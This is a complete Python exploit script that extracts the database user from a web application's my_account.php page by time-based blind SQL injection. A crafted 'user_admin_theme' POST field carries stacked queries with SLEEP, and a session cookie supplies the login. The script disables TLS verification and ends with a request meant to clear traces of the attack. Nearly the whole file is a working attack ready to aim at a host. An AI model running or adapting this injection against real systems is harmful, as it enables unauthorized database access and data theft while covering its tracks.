import requests
import time
from urllib3.exceptions import InsecureRequestWarning

alfabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJLMNOPQRSTUVWXYZ1234567890!.-,_:;"Â£$&/()=\'+*'

url = 'https://<host>/my_account.php' # replace with target url
cookies = {"PHPSESSID": "fiiqcgr4j3vqmjqgmlc97ehdg8"} # valid session
user_mail = "user@email.com" # email of the user for the valid session

sleep_time = 5
max_lenght = 200
no_match=False
headers = {"User-Agent": "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"}
ts = int(time.time())+7200

out = ''

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


for i in range(max_lenght):
    for letter in alfabet:
        query = f"SELECT CASE WHEN (user() like '{out+letter}%') THEN SLEEP({sleep_time}) ELSE SLEEP(0) END"
        data = {
            "user_admin_theme": f"dark', '{ts}') ON DUPLICATE KEY UPDATE `timestamp`='{ts}'; {query} -- ",
            "user_email": user_mail,
            "submit_form": 1
        }

        current_time = time.time()
        r = requests.post(url, cookies=cookies, verify=False, data=data, headers=headers, allow_redirects=False)
        end_time=time.time()

        if end_time-current_time > sleep_time:
            out += letter
            print(out)
            break
        
        if letter == alfabet[-1]:
            no_match = True
    
    if no_match:
        break

print(f"Result: {out}")

# send a normal request to clear any artifacts produced by the attack:
data = {
            "user_admin_theme": "vibrant",
            "user_email": user_mail,
            "submit_form": 1
        }

r = requests.post(url, cookies=cookies, verify=False, data=data, headers=headers, allow_redirects=False)